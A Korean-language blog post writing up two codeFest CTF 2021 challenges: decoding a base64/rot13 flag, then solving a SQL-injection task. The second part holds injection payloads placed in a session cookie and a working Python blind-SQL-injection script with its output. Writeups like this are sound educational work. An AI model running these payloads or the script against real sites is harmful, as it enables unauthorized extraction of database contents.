---
layout: post
title:  "codeFest CTF 2021 Writeup"
tags: [CTF]
excerpt: "UTCTF 2021 Writeup"
---

## Sanity Check 2

```
+ Description
    + do not confuse encodINg wiD Encryption XD !
```

+ #### 문제 분석 & 문제 풀이

    이 문제는 다른 웹 문제와 달리 링크가 존재하지 않습니다.

    해당 문제의 설명으로 보아

    codeFest 페이지 어딘가에 있을것이다 예상하고

    메인 페이지의 소스코드를 살펴보면

    ```html
    <!-- cGJxcnNyZmd7UTBobzFsXzNhcDBxM3FfRmdlMWE4fQ== -->
    ```

    하단에 주석으로 base64 인코딩된 문자열이 있는것을 보고 base64 디코딩 시키면

    ``pbqrsrfg{Q0ho1l_3ap0q3q_Fge1a8}`` 이런 값이 나오게 됩니다.

    처음에는 어떤식으로 접근해야될지 몰랐지만 해당 ctf의 경우 FLAG가 ``codefest{}`` 형식인데

    ```py
    >>> chr(ord('p')-13)
    'c'
    >>> chr(ord('b')+13)
    'o'
    >>> chr(ord('q')-13)
    'd'
    >>> chr(ord('r')-13)
    'e'
    >>> chr(ord('s')-13)
    'f'
    >>> chr(ord('r')-13)
    'e'
    >>> chr(ord('f')+13)
    's'
    ...
    ```

    인코딩 종류중 rot13 인코딩이 위의 문자열과 일치한 패턴이라는것을 발견하고

    [rot13 decode link](https://rot13.com/) 해당 사이트에서 디코딩을 한 결과

    ``codefest{D0ub1y_3nc0d3d_Str1n8}`` 정상적인 codefest 플래그가 나오게 됩니다.

``Flag is codefest{D0ub1y_3nc0d3d_Str1n8}``

## SQL 2.0

```
+ Description
    + You cant get what you inject. ;)
    + someone exported this dump

+ Link
    + http://chall.codefest.tech:5000/

+ FILE
    + dump.txt
```

+ #### 문제 분석

    문제 링크에 들어가보면

    ![main-page](/post-images/codeFestCTF/WEB/2021/SQL-2.0/main-page.png)

    귀여운 강아지 2마리와 privacy 이라는 하이퍼 링크가 있는것을 볼 수 있습니다.

    privacy 하이퍼 링크를 누르면 

    ![privacy](/post-images/codeFestCTF/WEB/2021/SQL-2.0/privacy.png)

    이번에는 웃고있는 강아지가 나오는데

    페이지 소스코드를 분석해도 아무런 정보를 얻지 못하여 

    ``F12 -> Console`` 으로 이동한 다음 

    ```js
    document.cookie
    ```

    페이지의 쿠키를 확인해보면

    ```js
    document.cookie
    "session_id=9c8de291-7515-4c1c-a522-05f0a89f7adc"
    ```

    ``session_id`` 이라는 이름으로 쿠키를 사용하는걸 볼 수 있습니다.

    해당 session_id 쿠키에 ``' or sleep(1000) -- '`` 페이로드를 이용하여

    Time Based SQL Injection를 시도하면

    ``sleep(1000)``으로 인해 성공적으로 계속 로딩이 걸리게 됩니다.

+ #### 문제 풀이

    정확한 분석을 위해 다른 SQL 구문으로 테스트를 해본 결과

    ```
    ' or 1=1 -- '
    200 OK

    ' or 1=2 -- '
    500 Internal Server Error
    ```

    SQLi 구문이 참이면 웹 페이지가 작동하고 거짓이면 500 에러가 나는것을 볼 수 있습니다.

    아까 문제 파일에 있었던 dump.txt 를 보면

    ```sql
    -- MySQL dump 10.13  Distrib 8.0.23, for Linux (x86_64)
    --
    -- Host: localhost    Database: web_chall
    -- ------------------------------------------------------
    -- Server version	8.0.23
    
    /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
    /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
    /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
    /*!50503 SET NAMES utf8mb4 */;
    /*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
    /*!40103 SET TIME_ZONE='+00:00' */;
    /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
    /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
    /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
    /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
    
    --
    -- Table structure for table `secrets`
    --
    
    DROP TABLE IF EXISTS `secrets`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!50503 SET character_set_client = utf8mb4 */;
    CREATE TABLE `secrets` (
      `type` varchar(100) DEFAULT NULL,
      `value` varchar(100) DEFAULT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `secrets`
    --
    
    LOCK TABLES `secrets` WRITE;
    /*!40000 ALTER TABLE `secrets` DISABLE KEYS */;
    INSERT INTO `secrets` VALUES ('flag','***REDACTED***');
    /*!40000 ALTER TABLE `secrets` ENABLE KEYS */;
    UNLOCK TABLES;
    
    --
    -- Table structure for table `sessions`
    --
    
    DROP TABLE IF EXISTS `sessions`;
    /*!40101 SET @saved_cs_client     = @@character_set_client */;
    /*!50503 SET character_set_client = utf8mb4 */;
    CREATE TABLE `sessions` (
      `session_id` varchar(100) DEFAULT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
    /*!40101 SET character_set_client = @saved_cs_client */;
    
    --
    -- Dumping data for table `sessions`
    --
    
    LOCK TABLES `sessions` WRITE;
    /*!40000 ALTER TABLE `sessions` DISABLE KEYS */;
    INSERT INTO `sessions` VALUES ('163d9405-64c3-4cef-9c00-89e3462beff3'),    ('73e13697-8594-4791-9266-8fcc0fc583d6'),('d71b2ab7-74e5-49fb-93ce-6e65e3f47983'),     ('12cac265-615d-463a-9770-96d76085d211'),('c850b330-86e2-4e6c-8662-9aba2c6fc310'),    ('e6dbdc4f-ba52-47ae-baa3-988cb2f00f2d'),('dedcb5ee-74f1-4671-bca1-ba0701e72e73');
    /*!40000 ALTER TABLE `sessions` ENABLE KEYS */;
    UNLOCK TABLES;
    /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
    
    /*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
    /*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
    /*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
    /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
    /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
    /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
    /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
    
    -- Dump completed on 2021-03-19 20:03:02
    ```

    ```sql
    INSERT INTO `secrets` VALUES ('flag','***REDACTED***');
    ```

    이렇게 secrets 테이블의 type 컬럼에 flag 이름으로 ``***REDACTED***`` 라고 되어있는것을 보고 FLAG가 들어있는것을 유추할 수 있습니다.

    아까 SQL구문으로 인해 발생하는 응답 에러를 이용하여 플래그가 들어있는것으로 예상되는 ``secrets`` 테이블을 대상으로 Blind SQL Injection를 시도하면

    ```py
    import requests
    import string
    import time

    url = "http://chall.codefest.tech:5000/"
    GetFlagCookies = {}
    FLAG = ''

    List = list(string.ascii_letters + string.ascii_lowercase + string.digits + '{}')
    List.append('\_')

    while FLAG.find("}") == -1:
        for limit in List:
            GetFlagCookies['session_id'] = f"x' or (select `value` from `secrets` where `type`='flag' limit 0,1) like binary '{FLAG + limit}%' -- '"
            r = requests.get(url, cookies = GetFlagCookies).status_code

            if r == 200:
                FLAG += limit
                print(FLAG)
                break
            elif r == 429:
                time.sleep(10)
    print(FLAG.replace('\_','_'))
    ```

    플래그에 탈취를 성공할 수 있습니다.

    ```
    c
    co
    cod
    code
    codef
    codefe
    codefest{
    codefest{S
    codefest{SH0R
    codefest{SH0R7
    codefest{SH0R7\_FL
    codefest{SH0R7\_FL4
    codefest{SH0R7\_FL4G
    codefest{SH0R7\_FL4G}
    codefest{SH0R7_FL4G}
    ```

``Flag is codefest{SH0R7_FL4G}``

## 후기

이번 CTF는 웹 2개의 문제밖에 없어 아쉬운점도 있었지만 그래도 재밌었다.